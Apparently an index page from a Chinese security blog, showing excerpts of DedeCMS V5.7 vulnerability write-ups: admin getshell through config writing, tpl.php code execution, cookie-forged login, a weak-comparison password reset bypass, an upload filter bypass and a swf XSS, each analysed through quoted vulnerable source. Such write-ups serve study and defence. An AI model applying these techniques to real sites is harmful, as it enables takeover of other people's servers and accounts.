@@ -1,0 +1,942 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/86/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-Dedecms/（CVE-2018-9175）Dedecms V5.7后台的两处getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Dedecms/%EF%BC%88CVE-2018-9175%EF%BC%89Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.437Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-9175）Dedecms-V5-7后台的两处getshell"><a href="#（CVE-2018-9175）Dedecms-V5-7后台的两处getshell" class="headerlink" title="（CVE-2018-9175）Dedecms V5.7后台的两处getshell"></a>（CVE-2018-9175）Dedecms V5.7后台的两处getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>后台写配置文件过滤不足导致写shell。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞代码分析"><a href="#漏洞代码分析" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h3><h4 id="第一个"><a href="#第一个" class="headerlink" title="第一个"></a>第一个</h4><p>在/dede/sys_verifies.php中的第152行处</p>
+<pre><code>else if ($action == &#39;getfiles&#39;)
+&#123;
+    if(!isset($refiles))
+    &#123;
+        ShowMsg(&quot;你没进行任何操作！&quot;,&quot;sys_verifies.php&quot;);
+        exit();
+    &#125;
+    $cacheFiles = DEDEDATA.&#39;/modifytmp.inc&#39;;
+    $fp = fopen($cacheFiles, &#39;w&#39;);
+    fwrite($fp, &#39;&lt;&#39;.&#39;?php&#39;.&quot;\r\n&quot;);
+    fwrite($fp, &#39;$tmpdir = &quot;&#39;.$tmpdir.&#39;&quot;;&#39;.&quot;\r\n&quot;);
+    $dirs = array();
+    $i = -1;
+    $adminDir = preg_replace(&quot;#(.*)[\/\\\\]#&quot;, &quot;&quot;, dirname(__FILE__));
+    foreach($refiles as $filename)
+    &#123;
+        $filename = substr($filename,3,strlen($filename)-3);
+        if(preg_match(&quot;#^dede/#i&quot;, $filename)) 
+        &#123;
+            $curdir = GetDirName( preg_replace(&quot;#^dede/#i&quot;, $adminDir.&#39;/&#39;, $filename) );
+        &#125; else &#123;
+            $curdir = GetDirName($filename);
+        &#125;
+        if( !isset($dirs[$curdir]) ) 
+        &#123;
+            $dirs[$curdir] = TestIsFileDir($curdir);
+        &#125;
+        $i++;
+        fwrite($fp, &#39;$files[&#39;.$i.&#39;] = &quot;&#39;.$filename.&#39;&quot;;&#39;.&quot;\r\n&quot;);
+    &#125;
+    fwrite($fp, &#39;$fileConut = &#39;.$i.&#39;;&#39;.&quot;\r\n&quot;);
+    fwrite($fp, &#39;?&#39;.&#39;&gt;&#39;);
+    fclose($fp);
+可以看到，这里会将$refiles数组中的内容写入配置文件modifytmp.inc中。
+
+dedecms对于输入是全局过滤的，在/common.inc.php中注册并过滤了外部提交的变量
+
+function _RunMagicQuotes(&amp;$svar)
+&#123;
+    if(!get_magic_quotes_gpc())
+    &#123;
+        if( is_array($svar) )
+        &#123;
+            foreach($svar as $_k =&gt; $_v) $svar[$_k] = _RunMagicQuotes($_v);
+        &#125;
+        else
+        &#123;
+            if( strlen($svar)&gt;0 &amp;&amp; preg_match(&#39;#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#&#39;,$svar) )
+            &#123;
+              exit(&#39;Request var not allow!&#39;);
+            &#125;
+            $svar = addslashes($svar);
+        &#125;
+    &#125;
+    return $svar;
+&#125;
+
+if (!defined(&#39;DEDEREQUEST&#39;))
+&#123;
+    //检查和注册外部提交的变量   (2011.8.10 修改登录时相关过滤)
+    function CheckRequest(&amp;$val) &#123;
+        if (is_array($val)) &#123;
+            foreach ($val as $_k=&gt;$_v) &#123;
+                if($_k == &#39;nvarname&#39;) continue;
+                CheckRequest($_k);
+                CheckRequest($val[$_k]);
+            &#125;
+        &#125; else
+        &#123;
+            if( strlen($val)&gt;0 &amp;&amp; preg_match(&#39;#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#&#39;,$val)  )
+            &#123;
+                exit(&#39;Request var not allow!&#39;);
+            &#125;
+        &#125;
+    &#125;
+
+    //var_dump($_REQUEST);exit;
+    CheckRequest($_REQUEST);
+    CheckRequest($_COOKIE);
+
+    foreach(Array(&#39;_GET&#39;,&#39;_POST&#39;,&#39;_COOKIE&#39;) as $_request)
+    &#123;
+        foreach($$_request as $_k =&gt; $_v)
+        &#123;
+            if($_k == &#39;nvarname&#39;) $&#123;$_k&#125; = $_v;
+            else $&#123;$_k&#125; = _RunMagicQuotes($_v);
+        &#125;
+    &#125;
+&#125;
+
+function _RunMagicQuotes(&amp;$svar)
+&#123;
+    if(!get_magic_quotes_gpc())
+    &#123;
+        if( is_array($svar) )
+        &#123;
+            foreach($svar as $_k =&gt; $_v) $svar[$_k] = _RunMagicQuotes($_v);
+        &#125;
+        else
+        &#123;
+            if( strlen($svar)&gt;0 &amp;&amp; preg_match(&#39;#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#&#39;,$svar) )
+            &#123;
+              exit(&#39;Request var not allow!&#39;);
+            &#125;
+            $svar = addslashes($svar);
+        &#125;
+    &#125;
+    return $svar;
+&#125;
+ 
+if (!defined(&#39;DEDEREQUEST&#39;))
+&#123;
+    //检查和注册外部提交的变量   (2011.8.10 修改登录时相关过滤)
+    function CheckRequest(&amp;$val) &#123;
+        if (is_array($val)) &#123;
+            foreach ($val as $_k=&gt;$_v) &#123;
+                if($_k == &#39;nvarname&#39;) continue;
+                CheckRequest($_k);
+                CheckRequest($val[$_k]);
+            &#125;
+        &#125; else
+        &#123;
+            if( strlen($val)&gt;0 &amp;&amp; preg_match(&#39;#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#&#39;,$val)  )
+            &#123;
+                exit(&#39;Request var not allow!&#39;);
+            &#125;
+        &#125;
+    &#125;
+ 
+    //var_dump($_REQUEST);exit;
+    CheckRequest($_REQUEST);
+    CheckRequest($_COOKIE);
+ 
+    foreach(Array(&#39;_GET&#39;,&#39;_POST&#39;,&#39;_COOKIE&#39;) as $_request)
+    &#123;
+        foreach($$_request as $_k =&gt; $_v)
+        &#123;
+            if($_k == &#39;nvarname&#39;) $&#123;$_k&#125; = $_v;
+            else $&#123;$_k&#125; = _RunMagicQuotes($_v);
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>可以看到，这里会将$refiles数组中的内容写入配置文件modifytmp.inc中。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Dedecms/%EF%BC%88CVE-2018-9175%EF%BC%89Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Dedecms/%EF%BC%88CVE-2018-9175%EF%BC%89Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell/" data-id="cl5c2qnpm004ly8v17k6e3vlt" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Dedecms/（CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Dedecms/%EF%BC%88CNVD-2018-01221%EF%BC%89DedeCMS%20V5.7%20SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.435Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CNVD-2018-01221）DedeCMS-V5-7-SP2存在代码执行漏洞"><a href="#（CNVD-2018-01221）DedeCMS-V5-7-SP2存在代码执行漏洞" class="headerlink" title="（CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞"></a>（CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>DedeCMS V5.7<br>SP2版本中tpl.php存在代码执行漏洞，攻击者可利用该漏洞在增加新的标签中上传木马，获取webshell</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>需要登录后台</p>
+<p>根据公开的漏洞知道tpl.php里面251-281行存在代码执行漏洞，打开tpl.php文件</p>
+<p><img src="/resource/(CNVD-2018-01221)DedeCMSV5.7SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><pre><code>(1)此处定义了一个savetagfile的函数，首先做一个判断，参数“action”是否等于savetagfile，如果等于，就进行下一步
+(2)csrf_chack(),这里有一个csrf检验的函数，我们需要加上token来绕过，token是登陆的令牌，当我们向服务器发送登录请求时，在客户端会生成一个用于验证的令牌。
+(3)正则表达式匹配，详情参见https://www.runoob.com/regexp/regexp-rule.html*
+   [a-z0-9_-]&#123;1,&#125;的意思是，匹配所有包含一个以上的字母数字下划线和横杠，后面的\.意思是匹配小数点
+   所以最终那个判断条件的意思是如果参数filename不符合上述的匹配条件，那么就不允许修改操作的进行，所以文件名必须要.lib.php结尾。
+(4)preg_replace的意思是执行一个正则表达式的搜索和替换，我们可以通过例子来分析一下,发现得到的$tagname的值为moonsec
+(5)stripslashes()的作用是引用用一个引用字符串，此处没有多大的作用
+(6)最后是把$content里的内容写入到相对用的路径里，问题就出在了这里，这一部分代码除了对写入的文件名字做了简单的过滤，除了有一个csrf防护之外，其他并没有什么安全措施，     
+   导致我们可以任意写入代码，如果我们直接写入一句话木马，那么就可以直接连上去拿webshell了
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Dedecms/%EF%BC%88CNVD-2018-01221%EF%BC%89DedeCMS%20V5.7%20SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Dedecms/%EF%BC%88CNVD-2018-01221%EF%BC%89DedeCMS%20V5.7%20SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qnpl004ky8v1a1hhhn24" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Dedecms/【开启会员注册】（SSV-97087）DeDecms 任意用户登录" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Dedecms/%E3%80%90%E5%BC%80%E5%90%AF%E4%BC%9A%E5%91%98%E6%B3%A8%E5%86%8C%E3%80%91%EF%BC%88SSV-97087%EF%BC%89DeDecms%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.432Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（SSV-97087）DeDecms-任意用户登录"><a href="#（SSV-97087）DeDecms-任意用户登录" class="headerlink" title="（SSV-97087）DeDecms 任意用户登录"></a>（SSV-97087）DeDecms 任意用户登录</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>漏洞编号：SSV-97087，提交时间：20180118</p>
+<p>dedecms的会员模块的身份认证使用的是客户端session，在Cookie中写入用户ID并且附上ID__ckMd5，用做签名。主页存在逻辑漏洞，导致可以返回指定uid的ID的Md5散列值。原理上可以伪造任意用户登录。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>在/member/index.php中会接收uid和action参数。uid为用户名，进入index.php后会验证Cookie中的用户ID与uid(用户名)并确定用户权限。</p>
+<pre><code>if($action == &#39;&#39;)
+   &#123;
+       include_once(DEDEINC.&quot;/channelunit.func.php&quot;);
+       $dpl = new DedeTemplate();
+       $tplfile = DEDEMEMBER.&quot;/space/&#123;$_vars[&#39;spacestyle&#39;]&#125;/index.htm&quot;;
+
+       //更新最近访客记录及站点统计记录
+       $vtime = time();
+       $last_vtime = GetCookie(&#39;last_vtime&#39;);
+       $last_vid = GetCookie(&#39;last_vid&#39;);
+       if(empty($last_vtime))
+       &#123;
+           $last_vtime = 0;
+       &#125;
+       if($vtime - $last_vtime &gt; 3600 || !preg_match(&#39;#,&#39;.$uid.&#39;,#i&#39;, &#39;,&#39;.$last_vid.&#39;,&#39;))
+       &#123;
+           if($last_vid!=&#39;&#39;)
+           &#123;
+               $last_vids = explode(&#39;,&#39;,$last_vid);
+               $i = 0;
+               $last_vid = $uid;
+               foreach($last_vids as $lsid)
+               &#123;
+                   if($i&gt;10)
+                   &#123;
+                       break;
+                   &#125;
+                   else if($lsid != $uid)
+                   &#123;
+                       $i++;
+                       $last_vid .= &#39;,&#39;.$last_vid;
+                   &#125;
+               &#125;
+           &#125;
+           else
+           &#123;
+               $last_vid = $uid;
+           &#125;
+           PutCookie(&#39;last_vtime&#39;, $vtime, 3600*24, &#39;/&#39;);
+           PutCookie(&#39;last_vid&#39;, $last_vid, 3600*24, &#39;/&#39;);
+</code></pre>
+<p>我们可以看到当uid存在值时就会进入我们现在的代码中，当cookie中的last_vid中不存在值为空时，就会将uid值赋予过去，$last_vid<br>= $uid;，然后PutCookie。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Dedecms/%E3%80%90%E5%BC%80%E5%90%AF%E4%BC%9A%E5%91%98%E6%B3%A8%E5%86%8C%E3%80%91%EF%BC%88SSV-97087%EF%BC%89DeDecms%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Dedecms/%E3%80%90%E5%BC%80%E5%90%AF%E4%BC%9A%E5%91%98%E6%B3%A8%E5%86%8C%E3%80%91%EF%BC%88SSV-97087%EF%BC%89DeDecms%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/" data-id="cl5c2qnpl004jy8v11fxh0eb8" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Dedecms/【开启会员注册】（SSV-97074）DeDecms 前台任意用户密码修改" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Dedecms/%E3%80%90%E5%BC%80%E5%90%AF%E4%BC%9A%E5%91%98%E6%B3%A8%E5%86%8C%E3%80%91%EF%BC%88SSV-97074%EF%BC%89DeDecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.429Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（SSV-97074）DeDecms-前台任意用户密码修改"><a href="#（SSV-97074）DeDecms-前台任意用户密码修改" class="headerlink" title="（SSV-97074）DeDecms 前台任意用户密码修改"></a>（SSV-97074）DeDecms 前台任意用户密码修改</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>无CVE， SSV-97074，提交时间：20180110</p>
+<p>在用户密码重置功能处，php存在弱类型比较，导致如果用户没有设置密保问题的情况下可以绕过验证密保问题，直接修改密码(管理员账户默认不设置密保问题)。值得注意的是修改的密码是member表中的密码，即使修改了管理员密码也是member表中的管理员密码，仍是无法进入管理</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>php弱类型比较问题很常见，在不同类型比较时，如果使用的是==，php会将其中一个数据进行强制转换为另一个，比如’123a’就会被强制转换成123。这样就出现了弱类型比较问题，当然如果使用===判断比较就不会出现问题了。常见比较如下</p>
+<pre><code>&#39;&#39; == 0 == false &#39;123&#39; == 123             //&#39;123&#39;强制转换为123 
+&#39;abc&#39; == 0　        //intval(&#39;abc&#39;)==0 
+&#39;123a&#39; == 123            //intval(&#39;123a&#39;)==123 
+&#39;0x01&#39; == 1             //被识别为十六进制
+&#39;0e123456789&#39; == &#39;0e987654321&#39;　　//被识别为科学计数法 
+[false] == [0] == [NULL] == [&#39;&#39;] 
+NULL == false == 0 
+true == 1
+</code></pre>
+<p>dedecms的/member/resetpassword.php就是用来处理用户密码重置的问题，问题出在75行开始处理验证密保问题处。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Dedecms/%E3%80%90%E5%BC%80%E5%90%AF%E4%BC%9A%E5%91%98%E6%B3%A8%E5%86%8C%E3%80%91%EF%BC%88SSV-97074%EF%BC%89DeDecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Dedecms/%E3%80%90%E5%BC%80%E5%90%AF%E4%BC%9A%E5%91%98%E6%B3%A8%E5%86%8C%E3%80%91%EF%BC%88SSV-97074%EF%BC%89DeDecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/" data-id="cl5c2qnpk004iy8v17zb5c0p1" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Dedecms/【开启会员注册】（CVE-2018-20129）Dedecms前台文件上传漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Dedecms/%E3%80%90%E5%BC%80%E5%90%AF%E4%BC%9A%E5%91%98%E6%B3%A8%E5%86%8C%E3%80%91%EF%BC%88CVE-2018-20129%EF%BC%89Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.427Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-20129）Dedecms前台文件上传漏洞"><a href="#（CVE-2018-20129）Dedecms前台文件上传漏洞" class="headerlink" title="（CVE-2018-20129）Dedecms前台文件上传漏洞"></a>（CVE-2018-20129）Dedecms前台文件上传漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>管理员用户前台可以绕过限制上传shell</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>漏洞在于用户发布文章上传图片处。处理文件在/include/dialog/select_images_post.php</p>
+<p>而上传文件存在全局过滤/include/uploadsafe.inc.php</p>
+<pre><code>#/include/uploadsafe.inc.php
+$cfg_not_allowall = &quot;php|pl|cgi|asp|aspx|jsp|php3|shtm|shtml&quot;;
+if(!empty($&#123;$_key.&#39;_name&#39;&#125;) &amp;&amp; (preg_match(&quot;#\.(&quot;.$cfg_not_allowall.&quot;)$#i&quot;,$&#123;$_key.&#39;_name&#39;&#125;) || !preg_match(&quot;#\.#&quot;, $&#123;$_key.&#39;_name&#39;&#125;)) )
+&#123;
+    if(!defined(&#39;DEDEADMIN&#39;))
+    &#123;
+        exit(&#39;Not Admin Upload filetype not allow !&#39;);
+    &#125;
+&#125;
+$imtypes = array
+    (
+    &quot;image/pjpeg&quot;, &quot;image/jpeg&quot;, &quot;image/gif&quot;, &quot;image/png&quot;, 
+    &quot;image/xpng&quot;, &quot;image/wbmp&quot;, &quot;image/bmp&quot;
+);
+ 
+if(in_array(strtolower(trim($&#123;$_key.&#39;_type&#39;&#125;)), $imtypes))
+&#123;
+    $image_dd = @getimagesize($$_key);
+    if (!is_array($image_dd))
+    &#123;
+        exit(&#39;Upload filetype not allow !&#39;);
+    &#125;
+&#125;
+</code></pre>
+<p>可以看到名字中不得有上述字符，且限制了content-type。按道理说直接限制不得存在的字符，似乎没有问题了，可在发布文章文件上传的处理文件select_images_post.php中存在如下代码：</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Dedecms/%E3%80%90%E5%BC%80%E5%90%AF%E4%BC%9A%E5%91%98%E6%B3%A8%E5%86%8C%E3%80%91%EF%BC%88CVE-2018-20129%EF%BC%89Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Dedecms/%E3%80%90%E5%BC%80%E5%90%AF%E4%BC%9A%E5%91%98%E6%B3%A8%E5%86%8C%E3%80%91%EF%BC%88CVE-2018-20129%EF%BC%89Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qnpk004hy8v1dbdk4zsj" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Dedecms/Dedecms找后台" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Dedecms/Dedecms%E6%89%BE%E5%90%8E%E5%8F%B0/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.424Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Dedecms找后台"><a href="#Dedecms找后台" class="headerlink" title="Dedecms找后台"></a>Dedecms找后台</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>仅针对windows系统</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>进入正题</p>
+<p>首先看核心文件common.inc.php 大概148行左右</p>
+<pre><code>if($_FILES)
+&#123;
+    require_once(DEDEINC.&#39;/uploadsafe.inc.php&#39;);
+&#125;
+</code></pre>
+<p>uploadsafe.inc.php</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Dedecms/Dedecms%E6%89%BE%E5%90%8E%E5%8F%B0/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Dedecms/Dedecms%E6%89%BE%E5%90%8E%E5%8F%B0/" data-id="cl5c2qnpc004gy8v1hrq0dvvp" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Dedecms/Dedecms swf文件反射型xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Dedecms/Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.422Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Dedecms-swf文件反射型xss"><a href="#Dedecms-swf文件反射型xss" class="headerlink" title="Dedecms swf文件反射型xss"></a>Dedecms swf文件反射型xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>DedeCMS 5.7<br>/images/swfupload/swfupload.swf文件movieName参数没有合适过滤，导致跨站脚本漏洞。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>详细说明：</p>
+<p>Location: /uploads/images/swfupload/swfupload.swf</p>
+<p>漏洞文件为：<a target="_blank" rel="noopener" href="http://www.dedecms.com/images/swfupload/swfupload.swf">http://www.dedecms.com/images/swfupload/swfupload.swf</a></p>
